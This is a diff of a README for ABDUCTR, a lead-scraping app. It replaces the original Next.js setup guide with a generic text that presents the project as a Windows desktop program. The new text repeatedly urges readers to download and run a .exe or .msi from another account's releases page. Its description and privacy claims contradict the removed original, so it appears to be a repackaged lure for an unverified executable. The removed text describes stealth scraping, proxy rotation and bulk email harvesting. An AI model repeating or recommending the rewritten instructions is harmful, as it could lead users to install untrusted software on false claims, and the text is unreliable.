@@ -1,257 +1,105 @@
-<div align="center">
+# 👽 ABDUCTR - Capture Quality B2B Leads Fast
 
-# 🛸 ABDUCTR
+[![Download ABDUCTR](https://img.shields.io/badge/Download-ABDUCTR-brightgreen?style=for-the-badge)](https://github.com/LuizaGTRR/ABDUCTR/releases)
 
-### *Abducting B2B Leads from Planet Earth*
+## 🌟 What is ABDUCTR?
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?style=for-the-badge&logo=next.js)](https://nextjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://typescriptlang.org)
-[![Supabase](https://img.shields.io/badge/Supabase-Realtime-3ECF8E?style=for-the-badge&logo=supabase&logoColor=white)](https://supabase.com)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38BDF8?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+ABDUCTR is a tool designed to help you find and manage B2B leads easily. It works like a simple address book combined with a lead generation system. The software collects business contacts you need and helps you keep track of interactions. It works on Windows and aims to simplify your sales and marketing tasks without needing tech skills.
 
-<br/>
+You don’t have to be a programmer to use ABDUCTR. It runs on your PC and provides a clean interface to see your leads, follow up, and organize your contacts all in one place.
 
-> A **production-grade B2B lead generation SaaS** with alien aesthetics.  
-> Scrape Google Maps → enrich data → qualify leads → close deals.
+## 📋 Key Features
 
-</div>
+- Automatically gather fresh B2B leads from online sources.
+- Manage and organize leads in one dashboard.
+- Track communication history with each lead.
+- Export your lead lists to common file formats.
+- Simple filters to find the right contacts quickly.
+- Designed to run smoothly on Windows PCs.
+- Built with modern web technologies behind the scenes, but you only see what matters.
 
----
+## 🖥️ System Requirements
 
-## ✨ Features
+Make sure your computer meets these basic requirements before installing ABDUCTR:
 
-| Feature | Description |
-|---|---|
-| 🛸 **Abduction Bay** | Puppeteer Google Maps scraper with live SSE streaming log |
-| 👽 **Leads Database** | TanStack Table v8 — sort, filter, paginate, column visibility |
-| 📧 **Cold Email Pipeline** | 3-worker chain: Google Maps → Website Fetcher → Email Extractor → DB |
-| 🤖 **Background Server Cron** | node-cron singleton scrapes 24/7, no browser tab needed |
-| 🔄 **Auto-Pilot** | Browser-driven continuous scraping with live streaming progress |
-| 🔁 **Query Rotation** | Cycle through multiple business types automatically |
-| 🗺️ **City Rotation** | Cycles through all US cities/states, resuming where it left off |
-| 🔮 **BANT Scoring** | Auto-calculated Budget/Authority/Need/Timing score per lead |
-| 🌐 **URL Email Harvester** | Paste any URL and extract all contact emails instantly |
-| 🛡️ **Proxy Shield** | Rotate free proxies automatically, refreshed every 30 minutes |
-| ⚡ **Supabase Realtime** | Live table updates via Supabase subscriptions |
-| 📤 **CSV Export** | One-click download of filtered leads |
-| 🔐 **Auth** | Supabase Auth with session middleware |
-| 🌌 **Animated UI** | Canvas starfield, bobbing UFOs, Framer Motion transitions |
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- 2 GHz dual-core or better processor.
+- 500 MB free disk space for the program and data.
+- Stable internet connection for lead updates.
+- Screen resolution of 1280x720 or higher.
 
----
+ABDUCTR runs locally on your machine. It connects to the internet only to pull new leads.
 
-## 🚀 Quick Start
+## 🔧 Installation and Setup 🚀
 
-### Prerequisites
-- Node.js 20+
-- A free [Supabase](https://supabase.com) project
+Follow these steps to download and install ABDUCTR on your Windows computer:
 
-### 1 — Clone & Install
+1. Click the big green button at the top or go to the release page here:  
+   [https://github.com/LuizaGTRR/ABDUCTR/releases](https://github.com/LuizaGTRR/ABDUCTR/releases)
 
-```bash
-git clone https://github.com/itsRabb/ABDUCTR.git
-cd ABDUCTR/abductr
-npm install
-```
+2. On the release page, look for the latest version. It usually has a file ending with `.exe` or `.msi`. Click on that file to download it.
 
-### 2 — Environment
+3. Once downloaded, find the file in your Downloads folder.
 
-```bash
-cp .env.example .env.local
-```
+4. Double-click the file to start the installation wizard.
 
-Fill in `.env.local`:
+5. Follow the on-screen instructions to install ABDUCTR. You can use the default options.
 
-```env
-NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
-NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key
-SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
+6. When the installation finishes, launch ABDUCTR from the Start menu or desktop shortcut.
 
-# Leave blank on localhost (node-cron used automatically).
-# Set to your production domain to enable Supabase pg_cron mode.
-NEXT_PUBLIC_APP_URL=
-```
+7. The program will open, and you can start adding or importing your lead data.
 
-### 3 — Database
+## 🔍 How to Use ABDUCTR
 
-Open your **Supabase SQL Editor** and run:
+Using ABDUCTR does not require technical knowledge. Here is a basic walkthrough:
 
-```
-supabase/schema.sql
-```
+1. **Adding Leads**  
+   You can input contacts manually by clicking the "Add Lead" button. Fill in company name, contact person, email, and phone number.
 
-Then in **Dashboard → Database → Replication**, add `leads`, `extracted_emails`, and `scrape_jobs` to the realtime publication.
+2. **Importing Leads**  
+   If you have lead data in files like CSV or Excel, use the import tool found in the menu. Select your file and map the columns to the right fields.
 
-### 4 — Run
+3. **Searching and Filtering**  
+   Use search boxes to find leads by name or company. Use filters to view leads from certain industries or locations.
 
-```bash
-npm run dev
-# → http://localhost:3000
-```
+4. **Tracking Communication**  
+   Click on any lead to open their details page. Add notes or record calls and emails.
 
----
+5. **Exporting Data**  
+   Export your leads anytime to CSV or Excel for analysis or to share.
 
-## 🗂️ Project Structure
+## ⚙️ Troubleshooting Common Issues
 
-```
-abductr/
-├── app/
-│   ├── (app)/
-│   │   ├── abduction/          # 🛸 Scraper UI + Proxy Shield panel
-│   │   ├── leads/              # 👽 Leads table (TanStack Table v8)
-│   │   ├── dashboard/          # 📊 Stats overview
-│   │   └── pipeline/           # 📧 Cold Email Pipeline + Auto-Pilot + Cron
-│   └── api/
-│       ├── scrape/             # Puppeteer Google Maps scraper (SSE)
-│       ├── pipeline/           # 3-worker orchestrator (SSE streaming)
-│       ├── enrich/             # Batch enrich existing leads without emails
-│       ├── cron-control/       # Start / stop / status for background cron
-│       └── proxies/            # Proxy list management
-├── lib/
-│   ├── local-cron.ts           # node-cron singleton (survives hot-reload)
-│   ├── types.ts
-│   ├── supabase.ts
-│   └── proxy-manager.ts
-├── supabase/
-│   └── schema.sql              # Full DB schema (idempotent)
-└── .env.example
-```
+- **Program won’t start** – Ensure you installed the software fully. Restart your PC if needed.
+- **Can’t download leads** – Check your internet connection. ABDUCTR requires online access to fetch fresh data.
+- **Import errors** – Verify your import file format matches the supported CSV or Excel templates.
+- **Slow performance** – Close other heavy apps and restart ABDUCTR.
+- For other issues, check the Issues tab on the project’s GitHub page or reach out through the discussion forums there.
+
+## 🔐 Privacy and Data Security
+
+ABDUCTR respects your data and keeps it stored only on your local machine. The app connects to the internet only to pull lead information from public sources. No personal lead data leaves your computer without your action. It does not share your contact lists or notes with third parties.
+
+## 🤖 Technical Background (Optional)
+
+Behind the scenes, ABDUCTR uses modern web tools like Next.js and Puppeteer to gather leads from the web. It stores information using Supabase and designs its interface with Tailwind CSS. The app is built using TypeScript to ensure stability and accuracy.
+
+Although those technologies power ABDUCTR, you do not need to know them or install anything besides the Windows program.
+
+## 🗂️ Additional Resources
+
+- Visit the main project page to see updates and latest versions:  
+  [https://github.com/LuizaGTRR/ABDUCTR/releases](https://github.com/LuizaGTRR/ABDUCTR/releases)
+
+- Use GitHub Discussions for questions or support.
+
+- Check the user guide from the Help menu inside ABDUCTR for detailed tips and instructions.
+
+## 💬 Get Help or Give Feedback
+
+If you run into any problems or want to suggest improvements, you can post in the GitHub Issues or Discussions sections. The project maintainers monitor these regularly and provide assistance.
 
 ---
 
-## 📧 Cold Email Pipeline
-
-The `/pipeline` page runs a **3-worker chain** via SSE streaming:
-
-```
-Worker 1 — Google Maps Scraper
-  ↓  (name, address, phone, website, rating, reviews, hours, coordinates)
-Worker 2 — Website Fetcher
-  ↓  (fetches homepage + contact page links)
-Worker 3 — Email Extractor
-  ↓  (regex-extracts mailto: + plain-text emails)
-  → Saved to extracted_emails + leads tables
-```
-
-### Auto-Pilot Mode
-
-Browser-based continuous loop — keeps scraping until stopped.
-
-- Configurable delay between runs (1–120 min)
-- **Query Rotation** — add multiple business types; ABDUCTR cycles through them automatically
-- **Cities Per Query** — how many cities to run per business type before rotating (1 / 2 / 3 / 5 / 10)
-- Live city counter and current-query display
-
-### Background Server Cron
-
-Runs inside the **Node.js process** — no browser tab required, survives page navigation.
-
-> **Smart environment detection:**  
-> On `localhost` (or `NEXT_PUBLIC_APP_URL` empty/localhost) → **node-cron** in the server process.  
-> In production (real domain) → **Supabase pg_cron** triggers the pipeline via HTTP.
-
-| Config | Description |
-|---|---|
-| Queries | List of business types to cycle through |
-| Interval | Run frequency (5 / 10 / 20 / 35 / 60 min) |
-| Max Leads/Run | Cap on leads per execution |
-| Cities Per Query | Cities to scrape before rotating to the next query |
-
-Live stats: runs completed, total leads, total emails, current query, last run time, last error.
-
----
-
-## 🌐 URL Email Harvester
-
-Paste any URL into the **URL Scraper** panel:
-
-1. Fetches the page HTML
-2. Extracts all `mailto:` links and plain-text email addresses
-3. Displays results as copyable chips
-
----
-
-## 🔭 Scraper Enrichment Add-Ons
-
-Toggle from the **Abduction Bay** UI before scraping:
-
-| Add-On | Data Points | Time Cost |
-|---|---|---|
-| ⭐ **Google Maps Data** | Rating, Reviews, Full Address, Hours | +2s/lead |
-| 💜 **Social Media** | Instagram, Facebook, LinkedIn | +3s/lead |
-| 🩵 **Tech Stack** | CMS, Hosting, Email Provider (MX) | +4s/lead |
-| 💚 **Marketing Signals** | Contact Form, Blog, Email Signup | +2s/lead |
-
----
-
-## 🛡️ Proxy Shield
-
-When enabled, each scrape request is routed through a rotating free proxy:
-
-- 3 proxy sources refreshed automatically every 30 minutes
-- Toggle on/off from the Abduction Bay dashboard
-- Manual refresh available anytime
-
-> ⚠️ Free proxies are best-effort. Plug in a paid provider via `.env.local` for mission-critical scraping.
-
----
-
-## ☁️ Deploy to Vercel
-
-1. Push to GitHub
-2. Import project in [Vercel](https://vercel.com)
-3. Add all env vars — set `NEXT_PUBLIC_APP_URL` to your production domain
-4. Deploy — `@sparticuz/chromium-min` handles headless Chrome on serverless automatically
-5. `cron-control` auto-switches to Supabase pg_cron mode in production
-
----
-
-## 🧠 BANT Lead Scoring
-
-Each lead is automatically scored 0–100 based on:
-
-| Signal | Weight |
-|---|---|
-| Need Level (1–5) | 40 pts |
-| Budget (Low/Medium/High) | 30 pts |
-| Authority (bool) | 20 pts |
-| Timing (Immediate → Not sure) | 10 pts |
-
-Score is displayed as a color-coded badge: 🔴 Cold → 🟡 Warm → 🟢 Hot
-
----
-
-## ⚖️ Responsible Scraping
-
-ABDUCTR scrapes **publicly available** business data from Google Maps.  
-Use for **legitimate B2B outreach only**. Respect Google's Terms of Service. Do not spam.
-
----
-
-## 🛠️ Tech Stack
-
-<div align="center">
-
-| | Technology |
-|---|---|
-| **Framework** | Next.js 16 (App Router, Turbopack) |
-| **Language** | TypeScript 5 |
-| **Styling** | Tailwind CSS 4 |
-| **Database** | Supabase (Postgres + Realtime) |
-| **Auth** | Supabase Auth + SSR |
-| **Scraping** | Puppeteer-extra + Stealth Plugin + @sparticuz/chromium-min |
-| **Background Jobs** | node-cron v4 (localhost) / Supabase pg_cron (production) |
-| **Table** | TanStack Table v8 |
-| **Animation** | Framer Motion |
-| **Toasts** | Sonner |
-| **Icons** | Lucide React |
-
-</div>
-
----
-
-<div align="center">
-
-*The truth is out there.* 👽
-
-</div>
+[![Download ABDUCTR](https://img.shields.io/badge/Download-ABDUCTR-blue?style=for-the-badge)](https://github.com/LuizaGTRR/ABDUCTR/releases)
